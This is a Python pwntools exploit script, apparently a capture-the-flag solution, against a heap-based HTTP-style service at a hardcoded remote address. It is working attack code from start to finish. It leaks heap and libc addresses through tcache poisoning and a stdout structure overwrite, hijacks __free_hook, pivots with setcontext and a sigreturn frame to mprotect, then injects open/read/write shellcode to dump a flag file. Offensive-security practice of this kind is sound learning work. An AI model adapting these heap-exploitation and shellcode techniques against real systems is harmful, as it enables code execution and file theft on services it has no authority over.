#coding=utf-8
from pwn import*
def add(content):
	p.sendline("POST /create Cookie: user=admin token: \x34\r\n\r\ncontent=" + content)
	sleep(0.05)
def delete(idx):
	p.sendline("POST /del Cookie: user=admin token: \x34\r\n\r\nindex=" + str(idx))
	sleep(0.05)
def edit(idx,content):
	p.sendline("POST /edit Cookie: user=admin token: \x34\r\n\r\nindex=" +str(idx) +  "&content="+ content)
	sleep(0.05)
while True:
	p = remote('183.129.189.62',61202)
	try:
		add('a'*0x18) #0
		add("b"*0x28) #1
		add("c"*0x100) #2
		add("a"*0x30) #3
		p.recvuntil('0x')
		data = '0x' + p.recv(12)
		leak = int(data,16)
		hbase = leak - 0x260
		print hex(hbase)
		for i in range(7):
			delete(0)
		for i in range(8):
			delete(2)
		add(p64(hbase + 0x2B0)) #4
		add(p64(hbase + 0x2B0)) #5
		add('\x60\xA7') #6

		for i in range(0,7):
			delete(1)
		add("m"*0x28) #7
		edit(7,p64(hbase + 0x2B0))
		add("n"*0x20) #8
		add("n"*0x20) #9
		add("n"*0x21) #10
		edit(10,p64(0xfbad1800) + '\0'*0x18 + p8(0xc8))
		lbase = u64(p.recvuntil('\x7F',timeout=0.3)[-6:].ljust(8,'\x00')) - 0x3eba00
		__free_hook_addr = lbase + 0x3ed8e8
		delete(3)
		delete(3)
		add('a'*0x30) #11
		edit(11,p64(__free_hook_addr))
		add("a"*0x30) #12
		add("a"*0x30) #13
		new_execve_env = __free_hook_addr & 0xfffffffffffff000

		# 指定机器的运行模式
		context.arch = "amd64"
		
		shellcode1 = '''
		xor rdi, rdi
		mov rsi, %d
		mov edx, 0x1000

		mov eax, 0
		syscall

		jmp rsi
		''' % new_execve_env

		
		payload = p64(lbase + libc.symbols['setcontext'] + 53) + p64(__free_hook_addr + 0x10) + asm(shellcode1)
		print len(payload)
		edit(13,payload) #13
		# 设置寄存器
		frame = SigreturnFrame()
		frame.rsp = __free_hook_addr + 8
		frame.rip = lbase + libc.symbols['mprotect'] # 0xa8 rcx
		frame.rdi = new_execve_env
		frame.rsi = 0x1000
		frame.rdx = 4 | 2 | 1
		shellcode = '''
		mov rax, 0x67616c662f2e ;// ./flag
		push rax

		mov rdi, rsp ;// ./flag
		mov rsi, 0 ;// O_RDONLY
		xor rdx, rdx ;// 置0就行
		mov rax, 2 ;// SYS_open
		syscall

		mov rdi, rax ;// fd 
		mov rsi,rsp  ;// 读到栈上
		mov rdx, 1024 ;// nbytes
		mov rax,0 ;// SYS_read
		syscall

		mov rdi, 1 ;// fd 
		mov rsi, rsp ;// buf
		mov rdx, rax ;// count 
		mov rax, 1 ;// SYS_write
		syscall

		mov rdi, 0 ;// error_code
		mov rax, 60
		syscall
		'''
		add('a'*0x100) #14
		edit(14,str(frame))
		delete(14)
		sleep(2)
		p.sendline(asm(shellcode))
		break
	except:
		p.close()
		continue
p.interactive()
